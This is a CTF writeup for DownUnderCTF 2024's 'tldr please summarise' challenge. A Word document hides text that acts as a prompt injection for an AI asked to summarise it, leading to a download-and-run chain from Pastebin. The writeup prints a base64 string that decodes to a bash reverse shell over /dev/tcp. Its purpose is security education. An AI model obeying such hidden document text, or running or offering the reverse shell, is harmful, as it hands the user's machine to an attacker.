---
title: "tldr please summarise - DownUnderCTF 2024"
category: "misc"
type: "writeup"
tags: ["misc", "cyberchef", "base64", "tldr", "please", "summarise", "downunderctf", "downunderctf-2024", "2024", "ctf-writeup"]
summary: "Challenge description is like below:"
source:
  name: "CTFtime writeup #39317"
  url: "https://ctftime.org/writeup/39317"
original_source: "https://medium.com/@embossdotar/ctf-writeup-downunderctf-2024-tldr-please-summarise-8394e4471e91"
ctf:
  name: "DownUnderCTF 2024"
  year: 2024
  challenge: "tldr please summarise"
---

## Metadata

- **CTF:** DownUnderCTF 2024
- **Task:** tldr please summarise
- **Author team:** ctfrrteam
- **CTFtime:** <https://ctftime.org/writeup/39317>
- **Original writeup:** <https://medium.com/@embossdotar/ctf-writeup-downunderctf-2024-tldr-please-summarise-8394e4471e91>

---
Hi All,

Challenge description is like below:  
" I thought I was being 1337 by asking AI to help me solve challenges, now I have to reinstall Windows again. Can you help me out by find the flag in this document?  
Author: Nosurf "  
With attachment: EmuWar.docx

Quick notes about the description and title. 1337 may refer to [l33t](<https://en.wikipedia.org/wiki/Leet>). And TLDR meaning you can find [here](<https://en.wikipedia.org/wiki/TL;DR>).

You will not find the flag using [strings utility](<https://en.wikipedia.org/wiki/Strings_(Unix)>) in this case. So it’s time to open it!

Friendly reminder — yup, [docx](<https://en.wikipedia.org/wiki/Office_Open_XML>) can be a malicious file:P

During scrolling action an observant person may notice some possible interesting stuff:  
![](<https://miro.medium.com/v2/resize:fit:720/format:webp/1*PO-3LKsXobNCUqH-mpNrUA.png>)

EmuWar.docx content, source: DownUnderCTF2024

Do you see it? Not yet? And how about now:

![](<https://miro.medium.com/v2/resize:fit:720/format:webp/1*WQmyIM96Q5zWGgp3OX9HVg.png>)

EmuWar.docx content (‘hidden’ text), source: DownUnderCTF2024

You can zoom in it a little bit to try read it, but I prefer copy text like marked above and in few seconds extract almost ‘invisible’ this part (it’s just faster and more convenient).

To be truly, during competitions I was focused to get a flag in the shortest time — I was not familiar with text (sorry for that). But while writing this writeup I was so courious about the content, so I’ve got familiar with text.

It is lightweight and funny essay about [Emu War (aka. Great Emu War)](<https://en.wikipedia.org/wiki/Emu_War>) — thanks to this I had an opportunity to learn something new, many thanks!

Writeup category: Unintended.  
You can ask, why it’s unintended from my point of view? Nice question & thanks for asking!

In daily life, it’s not a good idea to just copy and paste some ‘random’ stuff in your console, etc (the same like download AND open (run) ‘random’ files on your PC). But I was using VM and I’m also enthusiast of other security measurements (by the way, I also like [Zero Trust Principle](<https://www.cloudflare.com/learning/security/glossary/what-is-zero-trust/>) in Security).

So, let’s get to the point — I just paste this to the Console:

![](<https://miro.medium.com/v2/resize:fit:720/format:webp/1*HBkSwHdtUGS16IFGBKuZFw.png>)

Flag, source: DownUnderCTF 2024 — tldr please summarise

FLAG — solution: DUCTF{chatgpt_I_n33d_2_3scap3}

Now it’s time to short explanation of safer (so proper) way.  
Mentioned ‘invisible’ text is:

![](<https://miro.medium.com/v2/resize:fit:720/format:webp/1*wAM2UaFWm9km_PH2WFCzjA.png>)

In general it looks like [AI poisoning](<https://www.crowdstrike.com/cybersecurity-101/cyberattacks/data-poisoning/>) or [prompt injection](<https://owasp.org/www-project-top-10-for-large-language-model-applications/Archive/0_1_vulns/Prompt_Injection.html>)..

The provided string contains a set of commands designed to download, decode, make executable, and run a shell script from a Pastebin link. Here’s a breakdown of each part:

Command Explanation:

![](<https://miro.medium.com/v2/resize:fit:720/format:webp/1*biSvbhbe-D0aPmc4xcbBjg.png>)

Below you can see pastebin link content:

![](<https://miro.medium.com/v2/resize:fit:720/format:webp/1*TcFlaphbZsr7VNI9AGunIQ.png>)

Encoded string — Base64  
Mentioned encoded content:  
YmFzaCAtaSA+JiAvZGV2L3RjcC8yNjEuMjYzLjI2My4yNjcvRFVDVEZ7Y2hhdGdwdF9JX24zM2RfMl8zc2NhcDN9IDA+JjE=

You can suppose that is encoded with [Base64](<https://en.wikipedia.org/wiki/Base64>) and you’re right. If any doubts you can use many tools, like for example awesome [CyberChef](<https://gchq.github.io/CyberChef/>) to be sure.

![](<https://miro.medium.com/v2/resize:fit:720/format:webp/1*Se-B-NLM7vmsCZjfjacyEA.png>)

Decoded string — b64  
Decoded b64 string:

![](<https://miro.medium.com/v2/resize:fit:720/format:webp/1*bvP9z9fpRyGuKH4IKfWxdQ.png>)

As you can see, that way was little more longer, but safer — and also you could get a Flag.

I hope this writeup was interesting for you and you could learn something new like security concepts from me — ie.: (another security tip — before a click, it’s nice idea to hover by mouse at link and check at lower left/right in your browser).  


I hope you enjoy!
